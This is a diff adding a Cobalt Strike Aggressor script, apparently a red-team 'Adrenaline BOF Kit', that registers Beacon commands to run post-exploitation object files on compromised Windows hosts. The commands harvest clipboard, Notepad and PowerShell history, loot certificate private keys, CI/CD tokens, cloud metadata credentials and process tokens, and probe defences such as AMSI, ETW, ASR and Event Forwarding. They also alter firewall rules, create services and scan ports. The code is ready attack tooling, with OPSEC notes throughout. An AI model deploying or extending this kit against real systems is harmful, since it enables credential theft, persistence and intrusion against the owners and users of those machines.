@@ -1,0 +1,862 @@
+# Adrenaline BOF Kit - Cobalt Strike Aggressor loader
+#
+# Load from Cobalt Strike: Script Manager -> Load -> adrenaline.cna
+# All Beacon aliases are prefixed with ad_ to avoid collisions.
+
+sub ad_bof_path {
+    local('$bid $base $barch $path');
+
+    $bid   = $1;
+    $base  = $2;
+    $barch = barch($bid);
+    $path  = script_resource($base . "." . $barch . ".o");
+
+    if (-exists $path) {
+        return $path;
+    }
+
+    berror($bid, "Adrenaline: missing BOF for " . $barch . " Beacon: " . $base . "." . $barch . ".o");
+    return "";
+}
+
+sub ad_read_bof {
+    local('$bid $base $path $handle $data');
+
+    $bid  = $1;
+    $base = $2;
+    $path = ad_bof_path($bid, $base);
+
+    if ($path eq "") {
+        return "";
+    }
+
+    $handle = openf($path);
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    return $data;
+}
+
+sub ad_run {
+    local('$bid $base $description $args $data');
+
+    $bid         = $1;
+    $base        = $2;
+    $description = $3;
+    $args        = $4;
+    $data        = ad_read_bof($bid, $base);
+
+    if ($data eq "") {
+        return;
+    }
+
+    btask($bid, "Adrenaline BOF: " . $description);
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+sub ad_pack_z {
+    @_ = flatten(@_);
+    local('$bid $count');
+
+    $bid   = $1;
+    $count = size(@_) - 1;
+
+    if ($count == 0) { return ""; }
+    if ($count == 1) { return bof_pack($bid, "z", $2); }
+    if ($count == 2) { return bof_pack($bid, "zz", $2, $3); }
+    if ($count == 3) { return bof_pack($bid, "zzz", $2, $3, $4); }
+    if ($count == 4) { return bof_pack($bid, "zzzz", $2, $3, $4, $5); }
+    if ($count == 5) { return bof_pack($bid, "zzzzz", $2, $3, $4, $5, $6); }
+    if ($count == 6) { return bof_pack($bid, "zzzzzz", $2, $3, $4, $5, $6, $7); }
+    if ($count == 7) { return bof_pack($bid, "zzzzzzz", $2, $3, $4, $5, $6, $7, $8); }
+    if ($count == 8) { return bof_pack($bid, "zzzzzzzz", $2, $3, $4, $5, $6, $7, $8, $9); }
+
+    berror($bid, "Adrenaline: this alias supports up to 8 string arguments");
+    return "";
+}
+
+sub ad_pack_Z {
+    @_ = flatten(@_);
+    local('$bid $count');
+
+    $bid   = $1;
+    $count = size(@_) - 1;
+
+    if ($count == 0) { return ""; }
+    if ($count == 1) { return bof_pack($bid, "Z", $2); }
+    if ($count == 2) { return bof_pack($bid, "ZZ", $2, $3); }
+    if ($count == 3) { return bof_pack($bid, "ZZZ", $2, $3, $4); }
+    if ($count == 4) { return bof_pack($bid, "ZZZZ", $2, $3, $4, $5); }
+
+    berror($bid, "Adrenaline: this alias supports up to 4 wide-string arguments");
+    return "";
+}
+
+sub ad_usage {
+    blog($1, $2);
+}
+
+sub ad_is_help_arg {
+    local('$arg');
+
+    $arg = lc($1);
+    return ($arg eq "help" || $arg eq "-h" || $arg eq "--help" || $arg eq "/h" || $arg eq "/?" || $arg eq "?");
+}
+
+sub ad_help_notepad_grab {
+    blog($1, "\nCommand: ad_notepad_grab\n" .
+        "Summary: Extract text from open Notepad windows, optionally matching a title.\n" .
+        "Usage:   ad_notepad_grab run\n" .
+        "         ad_notepad_grab <title_filter>\n" .
+        "         run           - Execute without a title filter.\n" .
+        "         title_filter  - Optional. Only return text from windows whose title matches.\n");
+}
+
+sub ad_help_schtask_enum {
+    blog($1, "\nCommand: ad_schtask_enum\n" .
+        "Summary: Enumerate scheduled tasks through the Task Scheduler COM interface.\n" .
+        "Usage:   ad_schtask_enum local\n" .
+        "         ad_schtask_enum <server>\n" .
+        "         local   - Enumerate scheduled tasks on the current host.\n" .
+        "         server  - Optional. Remote host to query. Omit for local enumeration.\n" .
+        "Note:    Remote enumeration depends on COM/RPC reachability and token rights.\n");
+}
+
+sub ad_help_net_use {
+    blog($1, "\nCommand: ad_net_use\n" .
+        "Summary: Add, list, or delete mapped network resources through MPR/WNet APIs.\n" .
+        "Usage:   ad_net_use list [target]\n" .
+        "         ad_net_use add <unc_share> [username] [password] [device] [persist] [require_privacy]\n" .
+        "         ad_net_use delete <target> [persist] [force]\n" .
+        "         target           - Optional local drive or remote UNC for list; required for delete.\n" .
+        "         unc_share        - UNC path, for example \\\\fileserver\\share.\n" .
+        "         username         - Optional DOMAIN\\user credential context.\n" .
+        "         password         - Optional password for username.\n" .
+        "         device           - Optional local drive, for example Z:. Empty uses auto assignment.\n" .
+        "         persist          - Optional. 0 or 1. Default: 0.\n" .
+        "         require_privacy  - Optional. 0 or 1. Requests CONNECT_ENCRYPTED. Default: 0.\n" .
+        "         force            - Optional. 0 or 1. Default: 0.\n");
+}
+
+sub ad_help_certstore_loot {
+    blog($1, "\nCommand: ad_certstore_loot\n" .
+        "Summary: Enumerate certificate stores for exportable private keys.\n" .
+        "Usage:   ad_certstore_loot all\n" .
+        "         ad_certstore_loot <store_name> <location>\n" .
+        "         all         - Scan default store set.\n" .
+        "         store_name  - Optional. MY, CA, ROOT, Disallowed, TrustedPeople, or SmartCardRoot.\n" .
+        "         location    - Optional. CurrentUser or LocalMachine.\n" .
+        "Note:    Provide both optional values together, or provide neither to scan defaults.\n");
+}
+
+sub ad_help_cicd_credential_hunt {
+    blog($1, "\nCommand: ad_cicd_credential_hunt\n" .
+        "Summary: Find common CI/CD and developer credential artifacts under the current user profile.\n" .
+        "Usage:   ad_cicd_credential_hunt presence\n" .
+        "         ad_cicd_credential_hunt verbose\n" .
+        "         presence - Report paths and sizes only. Default BOF mode.\n" .
+        "         verbose  - Optional. Reads bounded previews. Presence mode is the default.\n" .
+        "Note:    Presence mode avoids printing token-like file content to Beacon output.\n");
+}
+
+sub ad_help_cloud_metadata_check {
+    blog($1, "\nCommand: ad_cloud_metadata_check\n" .
+        "Summary: Probe AWS, Azure, GCP, App Service, and Azure Arc metadata/identity paths.\n" .
+        "Usage:   ad_cloud_metadata_check full\n" .
+        "         ad_cloud_metadata_check presence [-aud arm|graph|other:<resource>|other <resource>]\n" .
+        "         ad_cloud_metadata_check -aud arm|graph|other:<resource>|other <resource>\n" .
+        "         full              - Full default output, including bounded credential snippets.\n" .
+        "         presence          - Optional. Report exposure/context without credential snippets.\n" .
+        "         -aud arm          - Optional. Azure Resource Manager audience. Default.\n" .
+        "         -aud graph        - Optional. Microsoft Graph audience.\n" .
+        "         -aud other:<res>  - Optional. Custom Azure audience/resource.\n" .
+        "Note:    Run presence first when you do not want credential snippets in output.\n");
+}
+
+sub ad_help_process_tokens_list {
+    blog($1, "\nCommand: ad_process_tokens_list\n" .
+        "Summary: Enumerate accessible process tokens with optional PID/process filtering.\n" .
+        "Usage:   ad_process_tokens_list all\n" .
+        "         ad_process_tokens_list [pid|process_name] [/debug|/enablesebug]\n" .
+        "         ad_process_tokens_list [/debug|/enablesebug] [pid|process_name]\n" .
+        "         all               - Enumerate accessible tokens without a filter.\n" .
+        "         pid|process_name  - Optional filter.\n" .
+        "         /debug           - Optional. Attempts to enable SeDebugPrivilege.\n" .
+        "Note:    SeDebugPrivilege is disabled by default for OPSEC.\n");
+}
+
+sub ad_help_tray_scout {
+    blog($1, "\nCommand: ad_tray_scout\n" .
+        "Summary: Enumerate system tray notification icons and owning processes.\n" .
+        "Usage:   ad_tray_scout normal\n" .
+        "         ad_tray_scout verbose\n" .
+        "         normal   - Print tray item names and owning executable names.\n" .
+        "         verbose  - Optional. Include full executable paths when resolvable.\n");
+}
+
+sub ad_help_window_list {
+    blog($1, "\nCommand: ad_window_list\n" .
+        "Summary: List visible desktop windows for the current user session.\n" .
+        "Usage:   ad_window_list titles\n" .
+        "         ad_window_list /pid\n" .
+        "         titles - List window titles only.\n" .
+        "         /pid  - Optional. Include owning PID and process name.\n");
+}
+
+sub ad_help_com_probe {
+    blog($1, "\nCommand: ad_com_probe\n" .
+        "Summary: Probe whether a COM object can be instantiated from a CLSID.\n" .
+        "Usage:   ad_com_probe <CLSID> [IID]\n" .
+        "         CLSID  - Required COM class GUID.\n" .
+        "         IID    - Optional interface GUID. Defaults to IUnknown behavior in the BOF.\n");
+}
+
+sub ad_help_firewall_rule {
+    blog($1, "\nCommand: ad_firewall_rule\n" .
+        "Summary: Add, remove, query, or list Windows Firewall rules through INetFwPolicy2 COM.\n" .
+        "Usage:   ad_firewall_rule list\n" .
+        "         ad_firewall_rule query <name>\n" .
+        "         ad_firewall_rule remove <name>\n" .
+        "         ad_firewall_rule add <name> <dir> <action> <protocol> [localport] [remoteport] [profile]\n" .
+        "         name       - Rule name.\n" .
+        "         dir        - in or out.\n" .
+        "         action     - allow or block.\n" .
+        "         protocol   - tcp, udp, or any.\n" .
+        "         localport  - Required for tcp/udp. Omit or empty for any.\n" .
+        "         remoteport - Optional remote port.\n" .
+        "         profile    - Optional. domain, private, public, or all. Default: all.\n");
+}
+
+sub ad_help_port_scan {
+    blog($1, "\nCommand: ad_port_scan\n" .
+        "Summary: Perform a bounded IPv4 TCP/UDP port scan against one host.\n" .
+        "Usage:   ad_port_scan <target> [ports] [protocol] [timeout_ms]\n" .
+        "         target      - Required IPv4 address or resolvable hostname.\n" .
+        "         ports       - Optional. top20, top100, port, comma list, or start-end. Default: top20.\n" .
+        "         protocol    - Optional. 0=tcp, 1=udp, 2=both. Default: 0.\n" .
+        "         timeout_ms  - Optional per-port timeout, 1-30000. Default: 1000.\n");
+}
+
+sub ad_help_service_control {
+    blog($1, "\nCommand: ad_service_control\n" .
+        "Summary: Manage local Windows services through the Service Control Manager.\n" .
+        "Usage:   ad_service_control query [service_name]\n" .
+        "         ad_service_control create <service_name> <bin_path> [display_name] [start_type] [service_type] [error_control]\n" .
+        "         ad_service_control start <service_name>\n" .
+        "         ad_service_control stop <service_name>\n" .
+        "         ad_service_control delete <service_name>\n" .
+        "         ad_service_control failure <service_name> <reset_seconds> [reboot_msg] [command] [actions]\n" .
+        "         start_type     - Optional raw Windows dwStartType constant.\n" .
+        "         service_type   - Optional raw Windows dwServiceType constant.\n" .
+        "         error_control  - Optional raw Windows dwErrorControl constant.\n" .
+        "         actions        - Optional comma-separated type:delay_ms values: restart, reboot, run, none.\n" .
+        "Note:    Create/delete/start/stop/failure changes usually require elevated rights.\n");
+}
+
+alias ad_help {
+    blog($1, "\nAdrenaline BOF Kit\n\n" .
+        "Command / Usage                                             Description\n" .
+        "---------------                                             -----------\n" .
+        "ad_ai_surface                                               Map AI developer tooling and config artifacts\n" .
+        "ad_clipboard_grab                                           Return current clipboard text\n" .
+        "ad_ide_extension_surface                                    Enumerate developer editor extensions\n" .
+        "ad_powershell_history                                       Collect PSReadLine and transcript artifacts\n" .
+        "ad_window_handles_enum                                      Enumerate window handles and clipboard access surface\n" .
+        "ad_net_use <list|add|delete> ...                            Add, list, or delete mapped drives through MPR\n" .
+        "ad_notepad_grab <run|title_filter>                          Extract text from open Notepad windows\n" .
+        "ad_schtask_enum <local|server>                               Enumerate scheduled tasks locally or remotely\n" .
+        "ad_session_view                                             Enumerate Terminal Services sessions\n" .
+        "ad_certstore_loot <all|store_name location>                  Find exportable certificates in local stores\n" .
+        "ad_cicd_credential_hunt <presence|verbose>                  Find CI/CD and developer credential artifacts\n" .
+        "ad_cloud_metadata_check <full|presence|-aud ...>            Probe cloud metadata and identity endpoints\n" .
+        "ad_process_tokens_list <all|pid|process> [/debug]           Enumerate accessible process tokens\n" .
+        "ad_amsi_etw_detect                                          Detect AMSI and ETW presence in the current process\n" .
+        "ad_app_count                                                Count installed applications\n" .
+        "ad_applocker_policy                                         Enumerate AppLocker policy configuration\n" .
+        "ad_asr_status                                               Enumerate Defender ASR rule state\n" .
+        "ad_bitlocker_status                                         Enumerate BitLocker status and policy configuration\n" .
+        "ad_mdm_policy_artifacts                                     Score Windows MDM enrollment posture\n" .
+        "ad_netjoin_query                                            Query Windows domain/workgroup join state\n" .
+        "ad_power_state                                              Infer host form factor\n" .
+        "ad_proxy_enum                                               Enumerate proxy configuration state\n" .
+        "ad_tray_scout <normal|verbose>                              Enumerate system tray notification icons\n" .
+        "ad_user_idle                                                Report user idle time and GUI handle usage\n" .
+        "ad_wallpaper_enum                                           Enumerate current desktop wallpaper paths\n" .
+        "ad_wef_detect                                               Detect Windows Event Forwarding configuration\n" .
+        "ad_window_list <titles|/pid>                                List visible desktop windows\n" .
+        "ad_win_version                                              Report concise Windows version information\n" .
+        "ad_wsc_status                                               Query Windows Security Center health state\n" .
+        "ad_com_probe <CLSID> [IID]                                  Probe COM class instantiation by CLSID\n" .
+        "ad_firewall_rule <add|remove|query|list> ...                Manage Windows Firewall rules through COM\n" .
+        "ad_port_scan <target> [ports] [protocol] [timeout_ms]       Bounded IPv4 TCP/UDP port scan against one host\n" .
+        "ad_service_control <query|create|start|stop|delete|failure> Manage local Windows services through SCM\n" .
+        "ad_wevt_logon_enum                                          Enumerate recent Security log logon events\n" .
+        "\nRun an argument-aware command without arguments for its syntax card.\n" .
+        "Examples: ad_port_scan, ad_process_tokens_list, ad_service_control\n");
+}
+
+alias ad_ai_surface {
+    ad_run($1, "collection/ai_surface/ai_surface", "ai_surface", "");
+}
+
+alias ad_clipboard_grab {
+    ad_run($1, "collection/clipboard_grab/clipboard_grab", "clipboard_grab", "");
+}
+
+alias ad_ide_extension_surface {
+    ad_run($1, "collection/ide_extension_surface/ide_extension_surface", "ide_extension_surface", "");
+}
+
+alias ad_powershell_history {
+    ad_run($1, "collection/powershell_history/powershell_history", "powershell_history", "");
+}
+
+alias ad_window_handles_enum {
+    ad_run($1, "collection/window_handles_enum/window_handles_enum", "window_handles_enum", "");
+}
+
+alias ad_notepad_grab {
+    @_ = flatten(@_);
+    local('$count');
+
+    $count = size(@_) - 1;
+    if ($count == 0 || ad_is_help_arg($2)) {
+        ad_help_notepad_grab($1);
+        return;
+    }
+    if (lc($2) eq "run") {
+        if ($count != 1) {
+            ad_help_notepad_grab($1);
+            return;
+        }
+        ad_run($1, "community/notepad_grab/notepad_grab", "notepad_grab", "");
+        return;
+    }
+    if ($count != 1) {
+        ad_help_notepad_grab($1);
+        return;
+    }
+
+    ad_run($1, "community/notepad_grab/notepad_grab", "notepad_grab", ad_pack_z(@_));
+}
+
+alias ad_schtask_enum {
+    @_ = flatten(@_);
+    local('$count');
+
+    $count = size(@_) - 1;
+    if ($count == 0 || ad_is_help_arg($2)) {
+        ad_help_schtask_enum($1);
+        return;
+    }
+    if (lc($2) eq "local") {
+        if ($count != 1) {
+            ad_help_schtask_enum($1);
+            return;
+        }
+        ad_run($1, "community/schtask_enum/schtask_enum", "schtask_enum", "");
+        return;
+    }
+    if ($count != 1) {
+        ad_help_schtask_enum($1);
+        return;
+    }
+
+    ad_run($1, "community/schtask_enum/schtask_enum", "schtask_enum", ad_pack_z(@_));
+}
+
+alias ad_session_view {
+    ad_run($1, "community/session_view/session_view", "session_view", "");
+}
+
+alias ad_net_use {
+    @_ = flatten(@_);
+    local('$count $subcmd $args $persist $privacy $force');
+
+    $count = size(@_) - 1;
+
+    if ($count == 0 || ad_is_help_arg($2)) {
+        ad_help_net_use($1);
+        return;
+    }
+
+    $subcmd = lc($2);
+
+    if ($subcmd eq "list") {
+        if ($count > 2) {
+            ad_help_net_use($1);
+            return;
+        }
+
+        if ($count == 1) {
+            $args = bof_pack($1, "sZ", 2, "");
+        } else {
+            $args = bof_pack($1, "sZ", 2, $3);
+        }
+        ad_run($1, "community/net_use/net_use", "net_use list", $args);
+        return;
+    }
+
+    if ($subcmd eq "add") {
+        if ($count < 2) {
+            ad_help_net_use($1);
+            return;
+        }
+        if ($count > 7) {
+            ad_help_net_use($1);
+            return;
+        }
+
+        $persist = 0;
+        $privacy = 0;
+        if ($7 ne "") {
+            $persist = $7;
+        }
+        if ($8 ne "") {
+            $privacy = $8;
+        }
+        $args = bof_pack($1, "sZZZZss", 1, $3, $4, $5, $6, $persist, $privacy);
+        ad_run($1, "community/net_use/net_use", "net_use add", $args);
+        return;
+    }
+
+    if ($subcmd eq "delete" || $subcmd eq "del" || $subcmd eq "remove") {
+        if ($count < 2) {
+            ad_help_net_use($1);
+            return;
+        }
+        if ($count > 4) {
+            ad_help_net_use($1);
+            return;
+        }
+
+        $persist = 0;
+        $force   = 0;
+        if ($4 ne "") {
+            $persist = $4;
+        }
+        if ($5 ne "") {
+            $force = $5;
+        }
+        $args = bof_pack($1, "sZss", 3, $3, $persist, $force);
+        ad_run($1, "community/net_use/net_use", "net_use delete", $args);
+        return;
+    }
+
+    ad_help_net_use($1);
+}
+
+alias ad_certstore_loot {
+    @_ = flatten(@_);
+    local('$count');
+
+    $count = size(@_) - 1;
+    if (ad_is_help_arg($2)) {
+        ad_help_certstore_loot($1);
+        return;
+    }
+    if ($count == 0) {
+        ad_help_certstore_loot($1);
+        return;
+    }
+    if (lc($2) eq "all") {
+        if ($count != 1) {
+            ad_help_certstore_loot($1);
+            return;
+        }
+        ad_run($1, "credential_access/certstore_loot/certstore_loot", "certstore_loot", "");
+        return;
+    }
+    if ($count != 0 && $count != 2) {
+        ad_help_certstore_loot($1);
+        return;
+    }
+
+    ad_run($1, "credential_access/certstore_loot/certstore_loot", "certstore_loot", ad_pack_z(@_));
+}
+
+alias ad_cicd_credential_hunt {
+    @_ = flatten(@_);
+    local('$count');
+
+    $count = size(@_) - 1;
+    if ($count == 0 || ad_is_help_arg($2)) {
+        ad_help_cicd_credential_hunt($1);
+        return;
+    }
+    if (lc($2) eq "presence") {
+        if ($count != 1) {
+            ad_help_cicd_credential_hunt($1);
+            return;
+        }
+        ad_run($1, "credential_access/cicd_credential_hunt/cicd_credential_hunt", "cicd_credential_hunt", "");
+        return;
+    }
+    if ($count != 1) {
+        ad_help_cicd_credential_hunt($1);
+        return;
+    }
+
+    ad_run($1, "credential_access/cicd_credential_hunt/cicd_credential_hunt", "cicd_credential_hunt", ad_pack_z(@_));
+}
+
+alias ad_cloud_metadata_check {
+    @_ = flatten(@_);
+    local('$count');
+
+    $count = size(@_) - 1;
+    if ($count == 0 || ad_is_help_arg($2)) {
+        ad_help_cloud_metadata_check($1);
+        return;
+    }
+    if (lc($2) eq "full") {
+        if ($count != 1) {
+            ad_help_cloud_metadata_check($1);
+            return;
+        }
+        ad_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check", "cloud_metadata_check", "");
+        return;
+    }
+
+    ad_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check", "cloud_metadata_check", ad_pack_z(@_));
+}
+
+alias ad_process_tokens_list {
+    @_ = flatten(@_);
+    local('$count');
+
+    $count = size(@_) - 1;
+    if ($count == 0 || ad_is_help_arg($2)) {
+        ad_help_process_tokens_list($1);
+        return;
+    }
+    if (lc($2) eq "all") {
+        if ($count != 1) {
+            ad_help_process_tokens_list($1);
+            return;
+        }
+        ad_run($1, "credential_access/process_tokens_list/process_tokens_list", "process_tokens_list", "");
+        return;
+    }
+    if ($count > 2) {
+        ad_help_process_tokens_list($1);
+        return;
+    }
+
+    ad_run($1, "credential_access/process_tokens_list/process_tokens_list", "process_tokens_list", ad_pack_z(@_));
+}
+
+alias ad_amsi_etw_detect {
+    ad_run($1, "discovery/amsi_etw_detect/amsi_etw_detect", "amsi_etw_detect", "");
+}
+
+alias ad_app_count {
+    ad_run($1, "discovery/app_count/applications_enum", "app_count", "");
+}
+
+alias ad_applocker_policy {
+    ad_run($1, "discovery/applocker_policy/applocker_policy", "applocker_policy", "");
+}
+
+alias ad_asr_status {
+    ad_run($1, "discovery/asr_status/asr_status", "asr_status", "");
+}
+
+alias ad_bitlocker_status {
+    ad_run($1, "discovery/bitlocker_status/bitlocker_status", "bitlocker_status", "");
+}
+
+alias ad_mdm_policy_artifacts {
+    ad_run($1, "discovery/mdm_policy_artifacts/mdm_policy_artifacts", "mdm_policy_artifacts", "");
+}
+
+alias ad_netjoin_query {
+    ad_run($1, "discovery/netjoin_query/netjoin_query", "netjoin_query", "");
+}
+
+alias ad_power_state {
+    ad_run($1, "discovery/power_state/power_state", "power_state", "");
+}
+
+alias ad_proxy_enum {
+    ad_run($1, "discovery/proxy_enum/proxy_enum", "proxy_enum", "");
+}
+
+alias ad_tray_scout {
+    @_ = flatten(@_);
+    local('$count');
+
+    $count = size(@_) - 1;
+    if ($count == 0 || ad_is_help_arg($2)) {
+        ad_help_tray_scout($1);
+        return;
+    }
+    if (lc($2) eq "normal") {
+        if ($count != 1) {
+            ad_help_tray_scout($1);
+            return;
+        }
+        ad_run($1, "discovery/tray_scout/tray_scout", "tray_scout", "");
+        return;
+    }
+    if ($count != 1) {
+        ad_help_tray_scout($1);
+        return;
+    }
+
+    ad_run($1, "discovery/tray_scout/tray_scout", "tray_scout", ad_pack_z(@_));
+}
+
+alias ad_user_idle {
+    ad_run($1, "discovery/user_idle/user_idle", "user_idle", "");
+}
+
+alias ad_wallpaper_enum {
+    ad_run($1, "discovery/wallpaper_enum/wallpaper_enum", "wallpaper_enum", "");
+}
+
+alias ad_wef_detect {
+    ad_run($1, "discovery/wef_detect/wef_detect", "wef_detect", "");
+}
+
+alias ad_window_list {
+    @_ = flatten(@_);
+    local('$count');
+
+    $count = size(@_) - 1;
+    if ($count == 0 || ad_is_help_arg($2)) {
+        ad_help_window_list($1);
+        return;
+    }
+    if (lc($2) eq "titles") {
+        if ($count != 1) {
+            ad_help_window_list($1);
+            return;
+        }
+        ad_run($1, "discovery/window_list/window_list", "window_list", "");
+        return;
+    }
+    if ($count != 1) {
+        ad_help_window_list($1);
+        return;
+    }
+
+    ad_run($1, "discovery/window_list/window_list", "window_list", ad_pack_z(@_));
+}
+
+alias ad_win_version {
+    ad_run($1, "discovery/win_version/win_version", "win_version", "");
+}
+
+alias ad_wsc_status {
+    ad_run($1, "discovery/wsc_status/wsc_status", "wsc_status", "");
+}
+
+alias ad_com_probe {
+    @_ = flatten(@_);
+    local('$count');
+
+    $count = size(@_) - 1;
+    if (ad_is_help_arg($2)) {
+        ad_help_com_probe($1);
+        return;
+    }
+    if ($count < 1 || $count > 2) {
+        ad_help_com_probe($1);
+        return;
+    }
+
+    ad_run($1, "execution/com_probe/com_probe", "com_probe", ad_pack_z(@_));
+}
+
+alias ad_firewall_rule {
+    @_ = flatten(@_);
+    local('$count');
+
+    $count = size(@_) - 1;
+    if (ad_is_help_arg($2)) {
+        ad_help_firewall_rule($1);
+        return;
+    }
+    if ($count < 1) {
+        ad_help_firewall_rule($1);
+        return;
+    }
+
+    ad_run($1, "execution/firewall_rule/firewall_rule", "firewall_rule", ad_pack_z(@_));
+}
+
+alias ad_port_scan {
+    @_ = flatten(@_);
+    local('$count $args $protocol $timeout');
+
+    $count = size(@_) - 1;
+    if (ad_is_help_arg($2)) {
+        ad_help_port_scan($1);
+        return;
+    }
+    if ($count < 1) {
+        ad_help_port_scan($1);
+        return;
+    }
+    if ($count > 4) {
+        ad_help_port_scan($1);
+        return;
+    }
+
+    if ($count == 1) {
+        $args = bof_pack($1, "z", $2);
+    } else if ($count == 2) {
+        $args = bof_pack($1, "zz", $2, $3);
+    } else if ($count == 3) {
+        $protocol = $4;
+        $args = bof_pack($1, "zzs", $2, $3, $protocol);
+    } else {
+        $protocol = $4;
+        $timeout  = $5;
+        $args = bof_pack($1, "zzsi", $2, $3, $protocol, $timeout);
+    }
+
+    ad_run($1, "execution/port_scan/port_scan", "port_scan", $args);
+}
+
+alias ad_service_control {
+    @_ = flatten(@_);
+    local('$count $subcmd $args');
+
+    $count = size(@_) - 1;
+    if (ad_is_help_arg($2)) {
+        ad_help_service_control($1);
+        return;
+    }
+    if ($count < 1) {
+        ad_help_service_control($1);
+        return;
+    }
+
+    $subcmd = lc($2);
+
+    if ($subcmd eq "query") {
+        if ($count > 2) {
+            ad_help_service_control($1);
+            return;
+        }
+
+        if ($count == 1) {
+            $args = bof_pack($1, "Z", $2);
+        } else {
+            $args = bof_pack($1, "ZZ", $2, $3);
+        }
+        ad_run($1, "execution/service_control/service_control", "service_control query", $args);
+        return;
+    }
+
+    if ($subcmd eq "start" || $subcmd eq "stop" || $subcmd eq "delete") {
+        if ($count != 2) {
+            ad_help_service_control($1);
+            return;
+        }
+        $args = bof_pack($1, "ZZ", $2, $3);
+        ad_run($1, "execution/service_control/service_control", "service_control " . $subcmd, $args);
+        return;
+    }
+
+    if ($subcmd eq "create") {
+        if ($count < 3) {
+            ad_help_service_control($1);
+            return;
+        }
+        if ($count > 7) {
+            ad_help_service_control($1);
+            return;
+        }
+
+        if ($count == 3) {
+            $args = bof_pack($1, "ZZZ", $2, $3, $4);
+        } else if ($count == 4) {
+            $args = bof_pack($1, "ZZZZ", $2, $3, $4, $5);
+        } else if ($count == 5) {
+            $args = bof_pack($1, "ZZZZi", $2, $3, $4, $5, $6);
+        } else if ($count == 6) {
+            $args = bof_pack($1, "ZZZZii", $2, $3, $4, $5, $6, $7);
+        } else {
+            $args = bof_pack($1, "ZZZZiii", $2, $3, $4, $5, $6, $7, $8);
+        }
+
+        ad_run($1, "execution/service_control/service_control", "service_control create", $args);
+        return;
+    }
+
+    if ($subcmd eq "failure") {
+        if ($count < 3) {
+            ad_help_service_control($1);
+            return;
+        }
+        if ($count > 6) {
+            ad_help_service_control($1);
+            return;
+        }
+
+        if ($count == 3) {
+            $args = bof_pack($1, "ZZi", $2, $3, $4);
+        } else if ($count == 4) {
+            $args = bof_pack($1, "ZZiZ", $2, $3, $4, $5);
+        } else if ($count == 5) {
+            $args = bof_pack($1, "ZZiZZ", $2, $3, $4, $5, $6);
+        } else {
+            $args = bof_pack($1, "ZZiZZZ", $2, $3, $4, $5, $6, $7);
+        }
+
+        ad_run($1, "execution/service_control/service_control", "service_control failure", $args);
+        return;
+    }
+
+    ad_help_service_control($1);
+}
+
+alias ad_wevt_logon_enum {
+    ad_run($1, "execution/wevt_logon_enum/wevt_logon_enum", "wevt_logon_enum", "");
+}
+
+beacon_command_register("ad_help", "List Adrenaline BOF commands", "Usage: ad_help");
+
+beacon_command_register("ad_ai_surface", "Map AI developer tooling and config artifacts", "Usage: ad_ai_surface");
+beacon_command_register("ad_clipboard_grab", "Return current clipboard text", "Usage: ad_clipboard_grab");
+beacon_command_register("ad_ide_extension_surface", "Enumerate developer editor extensions", "Usage: ad_ide_extension_surface");
+beacon_command_register("ad_powershell_history", "Collect PSReadLine and transcript artifacts", "Usage: ad_powershell_history");
+beacon_command_register("ad_window_handles_enum", "Enumerate window handles and clipboard access surface", "Usage: ad_window_handles_enum");
+
+beacon_command_register("ad_net_use", "Add, list, or delete mapped drives through MPR", "Usage: ad_net_use [list [target] | add <unc_share> [username] [password] [device] [persist:0|1] [require_privacy:0|1] | delete <target> [persist:0|1] [force:0|1]]");
+beacon_command_register("ad_notepad_grab", "Extract text from open Notepad windows", "Usage: ad_notepad_grab run\n  ad_notepad_grab <title_filter>");
+beacon_command_register("ad_schtask_enum", "Enumerate scheduled tasks locally or on a remote host", "Usage: ad_schtask_enum local\n  ad_schtask_enum <server>");
+beacon_command_register("ad_session_view", "Enumerate Terminal Services sessions", "Usage: ad_session_view");
+
+beacon_command_register("ad_certstore_loot", "Find exportable certificates in local stores", "Usage: ad_certstore_loot all\n  ad_certstore_loot <store_name> <CurrentUser|LocalMachine>");
+beacon_command_register("ad_cicd_credential_hunt", "Find common CI/CD and developer credential artifacts", "Usage: ad_cicd_credential_hunt presence\n  ad_cicd_credential_hunt verbose");
+beacon_command_register("ad_cloud_metadata_check", "Probe AWS, Azure, GCP, App Service, and Arc metadata paths", "Usage: ad_cloud_metadata_check full\n  ad_cloud_metadata_check presence [-aud arm|graph|other:<resource>|other <resource>]\n  ad_cloud_metadata_check -aud arm|graph|other:<resource>|other <resource>");
+beacon_command_register("ad_process_tokens_list", "Enumerate accessible process tokens", "Usage: ad_process_tokens_list all\n  ad_process_tokens_list [pid|process_name] [/debug|/enablesebug]\n  ad_process_tokens_list [/debug|/enablesebug] [pid|process_name]");
+
+beacon_command_register("ad_amsi_etw_detect", "Detect AMSI and ETW presence in the current process", "Usage: ad_amsi_etw_detect");
+beacon_command_register("ad_app_count", "Count installed applications from registry inventory", "Usage: ad_app_count");
+beacon_command_register("ad_applocker_policy", "Enumerate AppLocker policy registry configuration", "Usage: ad_applocker_policy");
+beacon_command_register("ad_asr_status", "Enumerate Defender ASR rule state", "Usage: ad_asr_status");
+beacon_command_register("ad_bitlocker_status", "Enumerate BitLocker status and policy configuration", "Usage: ad_bitlocker_status");
+beacon_command_register("ad_mdm_policy_artifacts", "Score Windows MDM enrollment posture", "Usage: ad_mdm_policy_artifacts");
+beacon_command_register("ad_netjoin_query", "Query Windows domain/workgroup join state", "Usage: ad_netjoin_query");
+beacon_command_register("ad_power_state", "Infer host form factor from chassis and power data", "Usage: ad_power_state");
+beacon_command_register("ad_proxy_enum", "Enumerate WinINET, WinHTTP, policy, browser, and environment proxy state", "Usage: ad_proxy_enum");
+beacon_command_register("ad_tray_scout", "Enumerate system tray notification icons", "Usage: ad_tray_scout normal\n  ad_tray_scout verbose");
+beacon_command_register("ad_user_idle", "Report user idle time and GUI handle usage", "Usage: ad_user_idle");
+beacon_command_register("ad_wallpaper_enum", "Enumerate current desktop wallpaper paths", "Usage: ad_wallpaper_enum");
+beacon_command_register("ad_wef_detect", "Detect Windows Event Forwarding configuration", "Usage: ad_wef_detect");
+beacon_command_register("ad_window_list", "List visible desktop windows", "Usage: ad_window_list titles\n  ad_window_list /pid");
+beacon_command_register("ad_win_version", "Report concise Windows version information", "Usage: ad_win_version");
+beacon_command_register("ad_wsc_status", "Query Windows Security Center health state", "Usage: ad_wsc_status");
+
+beacon_command_register("ad_com_probe", "Probe COM class instantiation by CLSID", "Usage: ad_com_probe <CLSID> [IID]");
